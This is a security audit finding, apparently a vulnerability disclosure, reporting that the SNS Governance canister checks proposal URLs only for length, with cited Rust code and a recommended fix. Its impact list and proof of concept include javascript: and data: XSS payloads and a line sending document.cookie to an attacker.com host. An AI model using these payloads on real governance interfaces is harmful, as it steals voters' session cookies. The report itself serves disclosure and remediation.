### Title
SNS Governance Proposal URL Field Accepts Arbitrary Schemes Including Non-HTTPS and Malicious Protocols - (File: rs/sns/governance/src/proposal.rs)

### Summary
The SNS Governance canister's `validate_and_render_proposal` function validates the proposal `url` field only for character count, not for URL scheme or content. This allows any SNS neuron holder to submit a proposal with an arbitrary URL (e.g., `javascript:`, `http://`, `data:text/html,...`) that is stored on-chain and served to governance UIs, violating the documented constraint ("specified using HTTPS") and creating a trust boundary violation analogous to the reported NFT image URL issue.

### Finding Description

In `rs/sns/governance/src/proposal.rs`, the `validate_and_render_proposal` function validates the proposal `url` field only via `validate_chars_count`, which checks only the character count against `PROPOSAL_URL_CHAR_MAX` (2000):

```rust
defects_push(validate_chars_count(
    "url",
    &proposal.url,
    NO_MIN,
    PROPOSAL_URL_CHAR_MAX,
));
``` [1](#0-0) 

No scheme validation, domain allowlisting, or protocol restriction is applied. The existing test fixture `basic_motion_proposal()` confirms this by using `url: "http://www.example.com"` and asserting `validate_default_proposal` succeeds: [2](#0-1) 

This contrasts sharply with NNS Governance's `validate_proposal_url`, which enforces `https://` and restricts to the `forum.dfinity.org` allowlist:

```rust
ic_nervous_system_common_validation::validate_url(
    url,
    PROPOSAL_URL_CHAR_MIN,
    PROPOSAL_URL_CHAR_MAX,
    "Proposal url",
    Some(vec!["forum.dfinity.org"]),
)?
``` [3](#0-2) 

The shared `validate_url` utility in `rs/nervous_system/common/validation/src/lib.rs` already enforces `https://` prefix, `@` prohibition, and optional domain allowlisting — but it is never called for SNS proposal URLs: [4](#0-3) 

The proto schema itself documents the field as "specified using HTTPS" but the canister does not enforce this: [5](#0-4) 

### Impact Explanation

An SNS neuron holder can submit a proposal with `url` set to:
- `javascript:alert(document.cookie)` — XSS if rendered as a link in a governance UI
- `data:text/html,<script>...</script>` — inline HTML/script injection
- `http://phishing-site.com` — phishing link displayed to voters
- Any attacker-controlled domain

The malicious URL is stored immutably on-chain in the SNS governance canister's replicated state and returned to any caller via query. Governance UIs (NNS dapp, SNS frontends) that render proposal URLs as clickable links without additional sanitization expose all voters to these attacks. The IC canister is the necessary vulnerable step: it accepts, validates (insufficiently), and persists the malicious URL.

**Impact: Medium** — Voters interacting with SNS governance UIs can be exposed to XSS, phishing, or spoofed content via malicious proposal URLs stored on-chain.

### Likelihood Explanation

**Likelihood: Medium** — Any SNS participant who has staked tokens and holds a neuron with proposal submission permissions can submit such a proposal. This is an unprivileged canister caller relative to the SNS governance canister. SNS governance is designed to be open to token holders, making this a realistic attack vector. The attacker only needs to pay the proposal rejection cost in SNS tokens.

### Recommendation

Apply the existing `validate_url` utility to SNS proposal URLs, mirroring the NNS governance approach:

```rust
// In validate_and_render_proposal, replace validate_chars_count for url with:
defects_push(
    ic_nervous_system_common_validation::validate_url(
        &proposal.url,
        NO_MIN,
        PROPOSAL_URL_CHAR_MAX,
        "url",
        None, // or an SNS-appropriate allowlist
    )
);
``` [6](#0-5) 

At minimum, enforce `https://` scheme. Optionally add a domain allowlist. Update the test fixture `basic_motion_proposal` to use a valid `https://` URL.

### Proof of Concept

1. Stake SNS tokens and claim a neuron with `SubmitProposal` permission.
2. Call `manage_neuron` with a `MakeProposal` command containing:
   ```
   Proposal {
     title: "Legitimate-looking proposal",
     summary: "...",
     url: "javascript:fetch('https://attacker.com/?c='+document.cookie)",
     action: Motion { motion_text: "..." }
   }
   ```
3. The SNS governance canister accepts and stores the proposal (only length is checked).
4. Any governance UI rendering `proposal.url` as an `<a href>` without sanitization executes the JavaScript payload when a voter clicks the link.

The `basic_motion_proposal` test in `rs/sns/governance/src/proposal.rs` already demonstrates that `http://www.example.com` passes `validate_default_proposal` without error, confirming the absence of scheme enforcement. [7](#0-6)

### Citations

**File:** rs/sns/governance/src/proposal.rs (L327-332)
```rust
    defects_push(validate_chars_count(
        "url",
        &proposal.url,
        NO_MIN,
        PROPOSAL_URL_CHAR_MAX,
    ));
```

**File:** rs/sns/governance/src/proposal.rs (L2931-2940)
```rust
    fn basic_motion_proposal() -> Proposal {
        let result = Proposal {
            title: "title".into(),
            summary: "summary".into(),
            url: "http://www.example.com".into(),
            action: Some(proposal::Action::Motion(Motion::default())),
        };
        assert_is_ok(validate_default_proposal(&result));
        result
    }
```

**File:** rs/nns/governance/api/src/proposal_validation.rs (L66-79)
```rust
pub fn validate_proposal_url(url: &str) -> Result<(), String> {
    // An empty string will fail validation as it is not a valid url,
    // but it's fine for us.
    if !url.is_empty() {
        ic_nervous_system_common_validation::validate_url(
            url,
            PROPOSAL_URL_CHAR_MIN,
            PROPOSAL_URL_CHAR_MAX,
            "Proposal url",
            Some(vec!["forum.dfinity.org"]),
        )?
    }

    Ok(())
```

**File:** rs/nervous_system/common/validation/src/lib.rs (L1-65)
```rust
/// Verifies that the url is within the allowed length, and begins with `https://`. In addition, it
/// will return an error in case of a possibly "dangerous" condition, such as the url containing a
/// username or password, or having a port, or not having a domain name.
pub fn validate_url(
    url: &str,
    min_length: usize,
    max_length: usize,
    field_name: &str,
    allowed_domains: Option<Vec<&str>>,
) -> Result<(), String> {
    // // Check that the URL is a sensible length
    if url.len() > max_length {
        return Err(format!(
            "{field_name} must be less than {max_length} characters long, but it is {} characters long. (Field was set to `{url}`.)",
            url.len(),
        ));
    }
    if url.len() < min_length {
        return Err(format!(
            "{field_name} must be greater or equal to than {min_length} characters long, but it is {} characters long. (Field was set to `{url}`.)",
            url.len(),
        ));
    }

    //

    if !url.starts_with("https://") {
        return Err(format!(
            "{field_name} must begin with https://. (Field was set to `{url}`.)",
        ));
    }

    let parts_url: Vec<&str> = url.split("://").collect();
    if parts_url.len() > 2 {
        return Err(format!(
            "{field_name} contains an invalid sequence of characters"
        ));
    }

    if parts_url.len() < 2 {
        return Err(format!("{field_name} is missing content after protocol."));
    }

    if url.contains('@') {
        return Err(format!(
            "{field_name} cannot contain authentication information"
        ));
    }

    let parts_past_protocol = parts_url[1].split_once('/');

    let (domain, _path) = match parts_past_protocol {
        Some((domain, path)) => (domain, Some(path)),
        None => (parts_url[1], None),
    };

    match allowed_domains {
        Some(allowed) => match allowed.contains(&domain) {
            true => Ok(()),
            false => Err(format!(
                "{field_name} was not in the list of allowed domains: {allowed:?}"
            )),
        },
        None => Ok(()),
    }
```

**File:** rs/sns/governance/proto/ic_sns_governance/pb/v1/governance.proto (L620-623)
```text
  // The web address of additional content required to evaluate the
  // proposal, specified using HTTPS. The URL string must not be longer than
  // 2000 bytes.
  string url = 3;
```
